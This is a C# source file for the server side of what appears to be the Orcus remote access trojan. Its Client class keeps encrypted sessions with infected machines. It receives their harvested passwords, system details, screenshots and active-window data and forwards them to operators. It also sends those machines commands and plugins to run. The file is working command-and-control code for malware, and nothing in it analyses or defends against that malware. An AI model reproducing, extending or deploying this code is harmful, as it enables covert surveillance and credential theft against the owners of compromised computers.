using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Security;
using System.Net.Sockets;
using System.Text;
using NLog;
using Orcus.Server.Core.Args;
using Orcus.Server.Core.ClientAcceptor;
using Orcus.Server.Core.Database;
using Orcus.Server.Core.Database.FileSystem;
using Orcus.Shared.Commands.ComputerInformation;
using Orcus.Shared.Commands.ExceptionHandling;
using Orcus.Shared.Commands.Password;
using Orcus.Shared.Communication;
using Orcus.Shared.Compression;
using Orcus.Shared.Connection;
using Orcus.Shared.Data;
using Orcus.Shared.DynamicCommands;
using Orcus.Shared.NetSerializer;

namespace Orcus.Server.Core
{
    public class Client : IDisposable
    {
        private static readonly Logger Logger = LogManager.GetCurrentClassLogger();

        private readonly BinaryReader _binaryReader;
        private readonly BinaryWriter _binaryWriter;
        private readonly SslStream _sslStream;
        private readonly TcpClient _client;
        private readonly Func<byte> _readByteDelegate;
        private readonly object _sendLock = new object();
        private readonly object _disposeLock = new object();
        private readonly ITcpServerInfo _tcpServerInfo;

        private static readonly Lazy<Serializer> PasswordDataSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(PasswordData)));

        private static readonly Lazy<Serializer> ComputerInformationSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ComputerInformation)));

        private static readonly Lazy<Serializer> ExceptionInfosSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(List<ExceptionInfo>)));

        private static readonly Lazy<Serializer> ServerPackageSerializer =
            new Lazy<Serializer>(() => new Serializer(typeof(ServerPackage)));

        public Client(ClientData clientData, CoreClientInformation computerInformation, TcpClient client,
            BinaryReader binaryReader, BinaryWriter binaryWriter, SslStream sslStream, ITcpServerInfo tcpServerInfo,
            LocationInfo locationInfo)
        {
            Id = clientData.Id;
            LocationInfo = locationInfo;

            var endPoint = (IPEndPoint) client.Client.RemoteEndPoint;
            Ip = endPoint.Address.ToString();
            Port = endPoint.Port;
            Data = clientData;
            ComputerInformation = computerInformation;
            _client = client;
            _binaryReader = binaryReader;
            _binaryWriter = binaryWriter;
            _sslStream = sslStream;
            _tcpServerInfo = tcpServerInfo;

            client.ReceiveTimeout = 0;
            client.SendTimeout = 0;

            _readByteDelegate += binaryReader.ReadByte;
            OnlineSince = DateTime.UtcNow;
            LastAnswer = DateTime.UtcNow;
        }

        public bool IsDisposed { get; private set; }
        public int Id { get; }
        public string Ip { get; }
        public int Port { get; }
        public CoreClientInformation ComputerInformation { get; }
        public ClientData Data { get; }
        public DateTime OnlineSince { get; }
        public LocationInfo LocationInfo { get; }
        public DateTime LastAnswer { get; private set; }

        public void Dispose()
        {
            if (IsDisposed)
                return;

            lock (_disposeLock)
            {
                if (IsDisposed)
                    return;

                IsDisposed = true;

                Logger.Debug("Dispose client CI-{0}", Id);

                using (_binaryReader)
                using (_binaryWriter)
                using (_sslStream)
                    _client.Close();

                Disconnected?.Invoke(this, EventArgs.Empty);
                Logger.Info("Client CI-{0} disconnected", Id);
            }
        }

        public event EventHandler Disconnected;
        public event EventHandler<SendPackageToAdministrationEventArgs> SendToAdministration;
        public event EventHandler<ExceptionsReveivedEventArgs> ExceptionsReveived;
        public event EventHandler<PasswordsReceivedEventArgs> PasswordsReceived;
        public event EventHandler<ComputerInformationReceivedEventArgs> ComputerInformationReceived;
        public event EventHandler<DynamicCommandEvent> ReceivedStaticCommandResult;
        public event EventHandler<PluginLoadedEventArgs> PluginLoaded;
        public event EventHandler<FilePushEventArgs> FilePush;

        public OnlineClientInformation GetOnlineClientInformation()
        {
            return new OnlineClientInformation
            {
                Group = Data.Group,
                Id = Data.Id,
                IpAddress = Ip,
                IsServiceRunning = ComputerInformation.IsServiceRunning,
                IsAdministrator = ComputerInformation.IsAdministrator,
                Language = Data.Language,
                Port = Port,
                OsType = Data.OSType,
                OsName = Data.OSName,
                UserName = Data.UserName,
                OnlineSince = OnlineSince,
                IsPasswordDataAvailable = Data.IsPasswordDataAvailable,
                IsComputerInformationAvailable = Data.IsComputerInformationAvailable,
                Plugins = ComputerInformation.Plugins,
                Version = ComputerInformation.ClientVersion,
                ApiVersion = (short) ComputerInformation.ApiVersion,
                ClientPath = ComputerInformation.ClientPath,
                LoadablePlugins = ComputerInformation.LoadablePlugins,
                FrameworkVersion = ComputerInformation.FrameworkVersion,
                LocatedCountry = LocationInfo?.Country,
                MacAddressBytes = ComputerInformation.MacAddress
            };
        }

        public void RequestSignOfLife()
        {
            lock (_sendLock)
            {
                _binaryWriter.Write((byte) FromAdministrationPackage.IsAlive);
                _binaryWriter.Write(0);
            }
        }

        public void BeginListen()
        {
            _readByteDelegate.BeginInvoke(EndRead, null);
        }

        private void ReportError(Exception ex, string methodName)
        {
            Logger.Error(ex, "Error when sending data to the client CI-{0} ({1})", Id, methodName);
        }

        public void SendPackage(byte command, WriterCall writerCall)
        {
            try
            {
                lock (_sendLock)
                {
                    _binaryWriter.Write(command);
                    _binaryWriter.Write(writerCall.Size);
                    writerCall.WriteIntoStream(_sslStream);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, System.Reflection.MethodBase.GetCurrentMethod().Name);
            }
        }

        public void SendStaticCommand(byte[] command, bool isCommandCompressed)
        {
            try
            {
                lock (_sendLock)
                {
                    _binaryWriter.Write(
                        (byte)
                            (isCommandCompressed
                                ? FromAdministrationPackage.SendStaticCommandCompressed
                                : FromAdministrationPackage.SendStaticCommand));
                    _binaryWriter.Write(command.Length);
                    _binaryWriter.Write(command);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, System.Reflection.MethodBase.GetCurrentMethod().Name);
            }
        }

        public void SendStaticCommandPlugin(byte[] plugin, int resourceId)
        {
            try
            {
                lock (_sendLock)
                {
                    _binaryWriter.Write((byte) FromAdministrationPackage.SendStaticCommandPlugin);
                    _binaryWriter.Write(plugin.Length + 4);
                    _binaryWriter.Write(resourceId);
                    _binaryWriter.Write(plugin);
                }
            }
            catch (Exception ex)
            {
                ReportError(ex, System.Reflection.MethodBase.GetCurrentMethod().Name);
            }
        }

        public void SendStaticCommandPlugin(string filename, int resourceId)
        {
            try
            {
                using (var fileStream = new FileStream(filename, FileMode.Open, FileAccess.Read))
                    lock (_sendLock)
                    {
                        _binaryWriter.Write((byte) FromAdministrationPackage.SendStaticCommandPlugin);
                        _binaryWriter.Write(fileStream.Length + 4);
                        _binaryWriter.Write(resourceId);

                        int read;
                        var buffer = new byte[4096];

                        while ((read = fileStream.Read(buffer, 0, buffer.Length)) > 0)
                        {
                            _binaryWriter.Write(buffer, 0, read);
                        }
                    }
            }
            catch (Exception ex)
            {
                ReportError(ex, System.Reflection.MethodBase.GetCurrentMethod().Name);
            }
        }

        private void ProcessServerPackage(ServerPackage serverPackage)
        {
            switch (serverPackage.ServerPackageType)
            {
                case ServerPackageType.AddPasswords:
                    PasswordsReceived?.Invoke(this,
                        new PasswordsReceivedEventArgs(
                            PasswordDataSerializer.Value.Deserialize<PasswordData>(serverPackage.Data),
                            serverPackage.RedirectPackage != null, serverPackage.RedirectPackage?.Administration ?? 0));
                    break;
                case ServerPackageType.SetComputerInformation:
                    ComputerInformationReceived?.Invoke(this,
                        new ComputerInformationReceivedEventArgs(
                            ComputerInformationSerializer.Value.Deserialize<ComputerInformation>(
                                serverPackage.Data), true, serverPackage.RedirectPackage?.Administration ?? 0));
                    break;
                default:
                    throw new ArgumentOutOfRangeException();
            }
        }

        public void AcceptPush(Guid guid)
        {
            lock (_sendLock)
            {
                _binaryWriter.Write((byte) FromAdministrationPackage.AcceptPush);
                _binaryWriter.Write(16);
                _binaryWriter.Write(guid.ToByteArray());
            }
        }

        public void FileTransferCompleted(Guid guid)
        {
            lock (_sendLock)
            {
                _binaryWriter.Write((byte) FromAdministrationPackage.TransferCompleted);
                _binaryWriter.Write(16);
                _binaryWriter.Write(guid.ToByteArray());
            }
        }

        public void StopActiveCommand(int dynamicCommandId)
        {
            lock (_sendLock)
            {
                _binaryWriter.Write((byte) FromAdministrationPackage.StopActiveCommand);
                _binaryWriter.Write(4);
                _binaryWriter.Write(dynamicCommandId);
            }
        }

        private void EndRead(IAsyncResult asyncResult)
        {
            try
            {
                byte parameter;
                try
                {
                    parameter = _readByteDelegate.EndInvoke(asyncResult); //no data available
                }
                catch (IOException)
                {
                    Dispose();
                    return;
                }
                
                var size = _binaryReader.ReadInt32();

                var bytes = _binaryReader.ReadBytes(size);
                LastAnswer = DateTime.UtcNow;

                ushort administrationId;
                switch ((FromClientPackage) parameter)
                {
                    case FromClientPackage.ResponseToAdministration:
                    case FromClientPackage.ResponseToAdministrationCompressed:
                        administrationId = BitConverter.ToUInt16(bytes, 0);

                        Logger.Debug("Client CI-{0} sends command response to administration AI-{1}", Id, administrationId);
                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(administrationId, parameter,
                                new WriterCall(bytes, 2, bytes.Length - 2)));
                        break;
                    case FromClientPackage.ResponseLoginOpen:
                        administrationId = BitConverter.ToUInt16(bytes, 0);
                        Logger.Debug("Client CI-{0} opened session with AI-{1}", Id, administrationId);

                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(administrationId,
                                (byte) FromClientPackage.ResponseLoginOpen, new WriterCall(BitConverter.GetBytes(Id))));
                        break;
                    case FromClientPackage.SubmitExceptions:
                        //log handled in server
                        ExceptionsReveived?.Invoke(this,
                            new ExceptionsReveivedEventArgs(
                                ExceptionInfosSerializer.Value.Deserialize<List<ExceptionInfo>>(LZF.Decompress(bytes, 0))));
                        break;
                    case FromClientPackage.ServerPackage:
                        //log handled in server
                        ProcessServerPackage(ServerPackageSerializer.Value.Deserialize<ServerPackage>(bytes));
                        break;
                    case FromClientPackage.ResponseStaticCommandResult:
                        var dynamicCommandId = BitConverter.ToInt32(bytes, 0);
                        var message = "";
                        ActivityType activityType;

                        if (ComputerInformation.ClientVersion >= 19)
                            activityType = (ActivityType) bytes[4];
                        else
                            activityType = bytes[4] == 0 ? ActivityType.Succeeded : ActivityType.Failed;

                        if (ComputerInformation.ClientVersion >= 13)
                            message = Encoding.UTF8.GetString(bytes, 5, bytes.Length - 5);

                        ReceivedStaticCommandResult?.Invoke(this,
                            new DynamicCommandEvent
                            {
                                ClientId = Id,
                                DynamicCommand = dynamicCommandId,
                                Timestamp = DateTime.UtcNow,
                                Message = message,
                                Status = activityType
                            });
                        break;
                    case FromClientPackage.PluginLoaded:
                        var pluginInfo = new PluginInfo
                        {
                            Guid = new Guid(bytes.Take(16).ToArray()),
                            Version = Encoding.ASCII.GetString(bytes, 16, bytes.Length - 16),
                            IsLoaded = true
                        };

                        Logger.Debug("Client CI-{0} loaded plugin {1:D} successfully", Id, pluginInfo.Guid);

                        ComputerInformation.Plugins.Add(pluginInfo);
                        PluginLoaded?.Invoke(this, new PluginLoadedEventArgs(pluginInfo));
                        break;
                    case FromClientPackage.PluginLoadFailed:
                        Logger.Debug("Client CI-{0} was unable to load plugin", Id);

                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(BitConverter.ToUInt16(bytes, 0),
                                (byte) FromClientPackage.PluginLoadFailed, new WriterCall(2 + bytes.Length, writer =>
                                {
                                    writer.Write(Id);
                                    writer.Write(bytes, 2, bytes.Length - 2);
                                })));
                        break;
                    case FromClientPackage.ResponseActiveWindow:
                        administrationId = BitConverter.ToUInt16(bytes, 0);

                        //+ 4 because of client id int, -2 because of administration id ushort
                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(administrationId,
                                (byte) FromClientPackage.ResponseActiveWindow, new WriterCall(bytes.Length + 2,
                                    writer =>
                                    {
                                        writer.Write(Id);
                                        writer.Write(bytes, 2, bytes.Length - 2);
                                    })));
                        break;
                    case FromClientPackage.ResponseScreenshot:
                        administrationId = BitConverter.ToUInt16(bytes, 0);
                        //+ 4 because of client id int, -2 because of administration id ushort
                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(administrationId,
                                (byte) FromClientPackage.ResponseScreenshot, new WriterCall(bytes.Length + 2,
                                    writer =>
                                    {
                                        writer.Write(Id);
                                        writer.Write(bytes, 2, bytes.Length - 2);
                                    })));
                        break;
                    case FromClientPackage.InitializePushFile:
                        //log handled in PushManager
                        _tcpServerInfo.PushManager.PushRequest(new Guid(bytes), this);
                        break;
                    case FromClientPackage.PushHeader:
                        FilePush?.Invoke(this,
                            new FilePushEventArgs(FilePushPackageType.Header, bytes,
                                new Guid(bytes.Take(16).ToArray())));
                        break;
                    case FromClientPackage.PushFileData:
                        FilePush?.Invoke(this,
                            new FilePushEventArgs(FilePushPackageType.Data, bytes,
                                new Guid(bytes.Take(16).ToArray())));
                        break;
                    case FromClientPackage.StillAlive:
                        break;
                    case FromClientPackage.RequestStaticCommandPlugin:
                        _tcpServerInfo.DynamicCommandManager.DynamicCommandPluginSender.RequestPlugin(this,
                            BitConverter.ToInt32(bytes, 0));
                        break;
                    case FromClientPackage.ResponseLibraryInformation:
                        Logger.Debug("Client CI-{0} requests more detailed information about library", Id);

                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(BitConverter.ToUInt16(bytes, 0),
                                (byte) FromClientPackage.ResponseLibraryInformation, new WriterCall(2 + bytes.Length, writer =>
                                {
                                    writer.Write(Id);
                                    writer.Write(bytes, 2, bytes.Length - 2);
                                })));
                        break;
                    case FromClientPackage.ResponseLibraryLoadingResult:
                        Logger.Debug("Client CI-{0} responded with the result of the library loading operation", Id);

                        SendToAdministration?.Invoke(this,
                            new SendPackageToAdministrationEventArgs(BitConverter.ToUInt16(bytes, 0),
                                (byte) FromClientPackage.ResponseLibraryLoadingResult, new WriterCall(2 + bytes.Length, writer =>
                                {
                                    writer.Write(Id);
                                    writer.Write(bytes, 2, bytes.Length - 2);
                                })));
                        break;
                    case FromClientPackage.CheckStillAlive:
                        break; //do nothing, TCP already responded when this package is here
                    default:
                        throw new ArgumentOutOfRangeException();
                }

                _readByteDelegate.BeginInvoke(EndRead, null);
            }
            catch (Exception ex)
            {
                if (IsDisposed)
                    return;

                Logger.Fatal(ex, "Error on reading data from client CI-{0}", Id);
                Dispose();
            }
        }
    }
}